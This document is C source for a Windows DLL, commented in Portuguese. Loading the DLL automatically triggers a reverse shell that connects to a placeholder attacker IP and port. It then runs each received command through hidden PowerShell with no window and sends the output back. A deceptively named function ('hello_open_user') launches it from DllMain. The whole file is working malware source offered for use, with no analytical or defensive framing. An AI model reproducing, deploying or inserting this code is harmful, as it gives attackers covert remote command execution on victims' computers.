#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

// Função para escrever na stream de rede
void WriteToStream(SOCKET sock, const char* str) {
    send(sock, str, strlen(str), 0);
}

// Função para executar o comando recebido
void ExecuteCommand(const char* command, char* output, int output_size) {
    SECURITY_ATTRIBUTES sa;
    HANDLE hRead, hWrite;
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    DWORD bytesRead;
    char buffer[128];
    char cmdLine[512];

    // Configurações de segurança para os pipes
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    // Criar pipes para redirecionar a saída
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        strncpy(output, "Falha ao criar pipe.\n", output_size);
        return;
    }

    // Configurar o STARTUPINFO
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.hStdError = hWrite;
    si.hStdOutput = hWrite;
    si.dwFlags |= STARTF_USESTDHANDLES;

    // Inicializar PROCESS_INFORMATION
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

    // Construir a linha de comando para o PowerShell
    snprintf(cmdLine, sizeof(cmdLine), "powershell.exe -WindowStyle Hidden -Command \"%s\"", command);

    // Criar o processo para executar o comando
    if (!CreateProcess(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        DWORD error = GetLastError();
        snprintf(output, output_size, "Falha ao criar processo. Código de erro: %lu\n", error);
        CloseHandle(hWrite);
        CloseHandle(hRead);
        return;
    }

    // Fechar o handle de escrita, pois não será usado
    CloseHandle(hWrite);

    // Ler a saída do comando
    output[0] = '\0';
    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        strncat(output, buffer, output_size - strlen(output) - 1);
    }

    // Fechar os handles
    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

// Função principal que estabelece a conexão TCP e executa comandos
void hello_open_user() {
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct sockaddr_in clientService; 
    char recvbuf[512];
    int recvbuflen = 512;

    // Inicializar o Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        MessageBox(NULL, "Falha ao inicializar o Winsock.", "Erro", MB_OK | MB_ICONERROR);
        return;
    }

    // Criar um socket
    ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        MessageBox(NULL, "Falha ao criar o socket.", "Erro", MB_OK | MB_ICONERROR);
        WSACleanup();
        return;
    }

    // Configurar a estrutura sockaddr_in com as informações do servidor
    clientService.sin_family = AF_INET;
    clientService.sin_addr.s_addr = inet_addr("<<IP>>");
    clientService.sin_port = htons(<<PORTA>>);

    // Conectar ao servidor
    if (connect(ConnectSocket, (struct sockaddr*)&clientService, sizeof(clientService)) == SOCKET_ERROR) {
        MessageBox(NULL, "Falha ao conectar ao servidor.", "Erro", MB_OK | MB_ICONERROR);
        closesocket(ConnectSocket);
        WSACleanup();
        return;
    }

    // Loop de comunicação
    WriteToStream(ConnectSocket, "SHELL> ");
    while (1) {
        int bytesReceived = recv(ConnectSocket, recvbuf, recvbuflen, 0);
        if (bytesReceived > 0) {
            recvbuf[bytesReceived - 1] = '\0';  // Remover o newline
            char output[4096];
            ExecuteCommand(recvbuf, output, sizeof(output));
            WriteToStream(ConnectSocket, output);
            WriteToStream(ConnectSocket, "SHELL> ");
        } else if (bytesReceived == 0) {
            break;  // Conexão fechada
        } else {
            MessageBox(NULL, "Erro ao receber dados.", "Erro", MB_OK | MB_ICONERROR);
            break;
        }
    }

    // Limpeza
    closesocket(ConnectSocket);
    WSACleanup();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH: {
            // Chama a função para executar a comunicação TCP
            hello_open_user();
            break;
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
